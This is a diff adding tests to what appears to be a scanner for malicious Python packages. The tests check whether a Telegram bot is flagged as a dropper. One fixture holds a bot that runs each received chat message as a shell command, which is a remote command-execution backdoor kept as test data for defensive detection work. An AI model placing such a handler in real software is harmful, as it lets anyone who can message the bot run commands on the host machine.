@@ -304,3 +304,48 @@ class TestADnsTunnel:
             "    return socket.getaddrinfo(os.environ.get('API_HOST', 'api.example.invalid'), 443)\n"
         )
         assert "MALWARE.EXFIL.DNS_TUNNEL.001" not in self.rules(tmp_path, module)
+
+
+class TestACommandReceivedOnAChannel:
+    """A chat bot that runs the text it is sent: the receive is not a request primitive, so the
+    channel side must come from the received-run fact itself (as `CAP.JS.RECEIVED_RUN` does)."""
+
+    @staticmethod
+    def severities(tmp_path: Path, module: str) -> dict[str, str]:
+        members = {
+            "PKG-INFO": "Metadata-Version: 2.1\nName: telem\nVersion: 1.0\n",
+            "pyproject.toml": "[project]\nname = 'telem'\nversion = '1.0'\n",
+            "src/telem/__init__.py": "",
+            "src/telem/bot.py": module,
+        }
+        archive = tmp_path / "telem-1.0.tar.gz"
+        with tarfile.open(archive, "w:gz") as tgz:
+            for name, text in members.items():
+                data = text.encode("utf-8")
+                info = tarfile.TarInfo(f"telem-1.0/{name}")
+                info.size = len(data)
+                tgz.addfile(info, io.BytesIO(data))
+        result = Scanner(Config.default().with_overrides(use_cache=False)).scan(archive)
+        return {f.rule_id: f.severity.name for f in result.findings}
+
+    def test_a_chat_message_run_as_a_command_blocks(self, tmp_path: Path) -> None:
+        module = (
+            "import subprocess\n"
+            "from telegram.ext import Application, MessageHandler, filters\n"
+            "async def on_message(update, context):\n"
+            "    subprocess.run(update.message.text, shell=True)\n"
+            "app = Application.builder().token('t').build()\n"
+            "app.add_handler(MessageHandler(filters.TEXT, on_message))\n"
+        )
+        found = self.severities(tmp_path, module)
+        assert found.get("SUSPECT.DROPPER.001") in ("HIGH", "CRITICAL"), found
+
+    def test_a_chat_bot_that_only_replies_does_not(self, tmp_path: Path) -> None:
+        module = (
+            "from telegram.ext import Application, MessageHandler, filters\n"
+            "async def on_message(update, context):\n"
+            "    await update.message.reply_text('got it')\n"
+            "app = Application.builder().token('t').build()\n"
+            "app.add_handler(MessageHandler(filters.TEXT, on_message))\n"
+        )
+        assert "SUSPECT.DROPPER.001" not in self.severities(tmp_path, module)
